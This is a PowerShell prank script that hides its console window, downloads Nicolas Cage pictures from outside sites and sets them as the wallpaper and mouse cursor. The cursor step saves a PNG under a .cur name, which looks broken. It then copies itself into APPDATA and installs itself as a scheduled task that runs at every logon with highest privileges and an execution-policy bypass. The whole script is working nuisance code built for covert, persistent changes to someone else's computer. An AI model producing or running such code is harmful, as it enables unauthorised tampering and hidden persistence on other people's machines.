# Hide the window
Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow(); [DllImport("User32.dll")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)  # Hides the console

# Random Nic Cage wallpapers
$images = @(
    "https://deadline.com/wp-content/uploads/2023/11/nicolas-cage.jpg",
    "https://assets-prd.ignimgs.com/2022/07/13/nicolas-cage-in-con-air-1657720981366.jpg",
    "https://snworksceo.imgix.net/rce/26b94560-9203-4db4-9d67-40310ef65e60.sized-1000x1000.jpeg?w=1000",
    "https://static1.srcdn.com/wordpress/wp-content/uploads/2023/11/nicolas-cage-talking-while-the-declaration-of-independence-is-the-background-in-national-treasure-image.jpg"
)
$randomImage = $images | Get-Random
$wallpaperPath = "$env:APPDATA\NicCage.jpg"
Invoke-WebRequest -Uri $randomImage -OutFile $wallpaperPath

# Set wallpaper
$code = @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void SetWallpaper(string path) {
        SystemParametersInfo(20, 0, path, 3);
    }
}
"@
Add-Type -TypeDefinition $code
[Wallpaper]::SetWallpaper($wallpaperPath)

# Set Nic Cage Cursor
$cursorUrl = "https://i.imgur.com/Ed4FakG.png"
$cursorPath = "$env:APPDATA\NicCageCursor.cur"
Invoke-WebRequest -Uri $cursorUrl -OutFile $cursorPath
$regPath = "HKCU:\Control Panel\Cursors"
Set-ItemProperty -Path $regPath -Name "Arrow" -Value $cursorPath
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters

# Add to Startup
$taskName = "NicCagePrank"
$scriptPath = "$env:APPDATA\niccage.ps1"
Copy-Item $MyInvocation.MyCommand.Path -Destination $scriptPath
schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -File $scriptPath" /sc onlogon /rl highest